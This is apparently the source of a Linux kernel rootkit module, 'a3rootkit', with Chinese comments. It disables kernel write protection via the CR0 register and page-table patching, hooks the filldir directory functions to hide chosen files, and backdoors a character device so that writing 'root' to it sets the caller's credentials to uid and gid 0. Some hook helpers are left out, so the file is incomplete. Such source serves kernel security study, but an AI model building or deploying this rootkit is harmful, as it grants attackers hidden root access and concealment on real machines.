#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/fs.h>
#include <linux/device.h>
#include <asm/io.h>
#include <asm/pgtable.h>
#include <asm-generic/memory_model.h>
#include <asm/pgtable_types.h>

#define DEVICE_NAME "a3rootkit"
#define CLASS_NAME "a3rootkit"

static int major_num;
static struct class *module_class;
static struct device *module_device;

static int a3_rootkit_open(struct inode *, struct file *);
static ssize_t a3_rootkit_read(struct file *, char __user *, size_t, loff_t *);
static ssize_t a3_rootkit_write(struct file *, const char __user *, size_t, loff_t *);
static int a3_rootkit_release(struct inode *, struct file *);
static long a3_rootkit_ioctl(struct file *, unsigned int, unsigned long);

static struct file_operations a3_rootkit_ops = {
    .open = a3_rootkit_open,
    .read = a3_rootkit_read,
    .write = a3_rootkit_write,
    .release = a3_rootkit_release,
    .unlocked_ioctl = a3_rootkit_ioctl,
};

/*hide file*/
#define HOOK_BUF_SZ 0x30

struct hook_info {
    char hook_data[HOOK_BUF_SZ];
    char orig_data[HOOK_BUF_SZ];
    void (*hook_before) (size_t *args);
    size_t (*orig_func) (size_t, size_t, size_t, size_t, size_t, size_t);
    size_t (*hook_after) (size_t orig_ret, size_t *args);
};

struct hook_info filldir_hook_info,filldir64_hook_info,compat_filldir_hook_info;
filldir_t filldir, filldir64, compat_filldir;

struct hide_file_info {
    struct list_head list;
    char *file_name;
};

struct list_head hide_file_list;

//读取cr0寄存器
size_t a3_rootkit_read_cr0(void)
{
    size_t cr0;

    asm volatile (
        "movq  %%cr0, %%rax;"
        "movq  %%rax, %0;   "
        : "=r" (cr0) :: "%rax"
    );

    return cr0;
}

//写入数据到cr0寄存器
void a3_rootkit_write_cr0(size_t cr0)
{
    asm volatile (
        "movq   %0, %%rax;  "
        "movq  %%rax, %%cr0;"
        :: "r" (cr0) : "%rax"
    );
}

void a3_rootkit_disable_write_protect(void)
{
    size_t cr0_val;

    cr0_val = a3_rootkit_read_cr0();

    /* if already disable, do nothing */
    if ((cr0_val >> 16) & 1) {
        cr0_val &= ~(1 << 16);
        a3_rootkit_write_cr0(cr0_val);
    }
}

void a3_rootkit_enable_write_protect(void)
{
    size_t cr0_val;

    cr0_val = a3_rootkit_read_cr0();

    /* if already enable, do nothing */
    if (!((cr0_val >> 16) & 1)) {
        cr0_val |= (1 << 16);
        a3_rootkit_write_cr0(cr0_val);
    }
}

void a3_rootkit_write_read_only_mem_by_cr0(void *dst, void *src,size_t len)
{
    size_t orig_cr0;

    orig_cr0 = a3_rootkit_read_cr0();

    a3_rootkit_disable_write_protect();

    memcpy(dst, src, len);

    /* if write protection is originally disabled, just do nothing */
    if ((orig_cr0 >> 16) & 1) {
        a3_rootkit_enable_write_protect();
    }
}

void a3_rootkit_write_romem_by_pte_patch(void *dst, void *src, size_t len)
{
    pte_t *dst_pte;
    pte_t orig_pte_val;
    unsigned int level;

    dst_pte = lookup_address((unsigned long) dst, &level);
    orig_pte_val.pte = dst_pte->pte;

    dst_pte->pte |= _PAGE_RW;
    memcpy(dst, src, len);

    dst_pte->pte = orig_pte_val.pte;
}

/* 一共要 hook 三个函数，因此还有另外两个和这个函数一模一样的函数，就不重复 copy 代码了：） */
size_t a3_rootkit_evil_filldir(size_t arg0, size_t arg1, size_t arg2, 
                               size_t arg3, size_t arg4, size_t arg5)
{
    struct hide_file_info *info = NULL;
    size_t args[6], ret;

    args[0] = arg0;
    args[1] = arg1;
    args[2] = arg2;
    args[3] = arg3;
    args[4] = arg4;
    args[5] = arg5;

    /* patch and call the original function */
    a3_rootkit_write_read_only_mem_by_ioremap(filldir_hook_info.orig_func, 
                                              filldir_hook_info.orig_data, 
                                              HOOK_BUF_SZ);

    /* check for whether the file to be hide is in result and delete them */
    list_for_each_entry(info, &hide_file_list, list) {
        if (!strncmp(info->file_name, args[1], args[2])) {
            ret = 1; /* it should be true, otherwise the iterate will stop */
            goto hide_out;
        }
    }

    /* normally fill */
    ret = filldir_hook_info.orig_func(args[0], args[1], args[2], 
                                      args[3], args[4], args[5]);

hide_out:
    /* re-patch the hook point again */
    a3_rootkit_write_read_only_mem_by_ioremap(filldir_hook_info.orig_func, 
                                              filldir_hook_info.hook_data, 
                                              HOOK_BUF_SZ);

    return ret;
}

//...

/* 你需要在模块初始化函数中调用该函数 */
void a3_rootkit_hide_file_subsystem_init(void)
{
    INIT_LIST_HEAD(&hide_file_list);
    a3_rootkit_text_hook(filldir, a3_rootkit_evil_filldir, 
                         &filldir_hook_info);
    a3_rootkit_text_hook(filldir64, a3_rootkit_evil_filldir64, 
                         &filldir64_hook_info);
    a3_rootkit_text_hook(compat_filldir, a3_rootkit_evil_compat_filldir, 
                         &compat_filldir_hook_info);
}

/* 这个函数用来添加新的隐藏文件：） */
void a3_rootkit_add_new_hide_file(const char *file_name)
{
    struct hide_file_info *info;

    info = kmalloc(sizeof(*info), GFP_KERNEL);
    info->file_name = kmalloc(strlen(file_name) + 1, GFP_KERNEL);
    strcpy(info->file_name, file_name);

    list_add(&info->list, &hide_file_list);
}

static int __init a3_rootkit_init(void)
{
    int err_code;

    printk(KERN_INFO"[a3_rootkit:] Module loaded. Start to register device...");

    /* register major num as char device */
    major_num = register_chrdev(0, DEVICE_NAME, &a3_rootkit_ops);
    if(major_num < 0) {
        printk(KERN_INFO "[a3_rootkit:] Failed to register a major number.\n");
        err_code = major_num;
        goto err_major;
    }    
    printk(KERN_INFO "[a3_rootkit:] Register complete, major number: %d\n", 
           major_num);

    /* create device class */
    module_class = class_create(THIS_MODULE, CLASS_NAME);
    if(IS_ERR(module_class)) {
        printk(KERN_INFO "[a3_rootkit:] Failed to register class device!\n");
        err_code = PTR_ERR(module_class);
        goto err_class;
    }
    printk(KERN_INFO "[a3_rootkit:] Class device register complete.\n");

    /* create device file */
    module_device = device_create(module_class, NULL, MKDEV(major_num, 0), 
                                  NULL, DEVICE_NAME);
    if(IS_ERR(module_device)) {
        printk(KERN_INFO "[a3_rootkit:] Failed to create the device!\n");
        err_code = PTR_ERR(module_device);
        goto err_dev;
    }
    printk(KERN_INFO "[a3_rootkit:] Module loaded successfully.");

    return 0;

err_dev:
    class_destroy(module_class);
err_class:
    unregister_chrdev(major_num, DEVICE_NAME);
err_major:
    return err_code;
}

static void __exit a3_rootkit_exit(void)
{
    device_destroy(module_class, MKDEV(major_num, 0));
    class_destroy(module_class);
    unregister_chrdev(major_num, DEVICE_NAME);
    printk(KERN_INFO "[a3_rootkit:] Module clean up. See you next time.");
}

void a3_rootkit_write_read_only_mem_by_ioremap(void *dst, void *src, size_t len)
{
    size_t dst_phys_page_addr, dst_offset;
    void* dst_ioremap_addr;

    dst_phys_page_addr = page_to_pfn(virt_to_page(dst)) * PAGE_SIZE;
    dst_offset = (size_t) dst & 0xfff;

    dst_ioremap_addr = (void*) ioremap(dst_phys_page_addr, len + 0x1000);
    memcpy((void*)(dst_ioremap_addr + dst_offset), src, len);
    iounmap(dst_ioremap_addr);
}

static int a3_rootkit_open(struct inode *inode, struct file *file)
{
    return 0;
}

static ssize_t a3_rootkit_read(struct file *file, char __user *buf, 
                               size_t count, loff_t *start)
{
    return count;
}

static ssize_t a3_rootkit_write(struct file *file, const char __user *buf, 
                                size_t count, loff_t *start)
{
    static char usr_data[0x100];
    int sz = count > 0x100 ? 0x100 : count;

    copy_from_user(usr_data, buf, sz);

    if (!strncmp(usr_data, "root", 4)) {
        struct cred *curr = current->cred;
        curr->uid = curr->euid = curr->suid = curr->fsuid = KUIDT_INIT(0);
        curr->gid = curr->egid = curr->sgid = curr->fsgid = KGIDT_INIT(0);
    }

    return sz;
}

static int a3_rootkit_release(struct inode *inode, struct file *file)
{
    return 0;
}

static long a3_rootkit_ioctl(struct file *file, unsigned int cmd, 
                             unsigned long arg)
{
    return 0;
}

module_init(a3_rootkit_init);
module_exit(a3_rootkit_exit);
MODULE_LICENSE("GPL");
MODULE_AUTHOR("arttnba3");
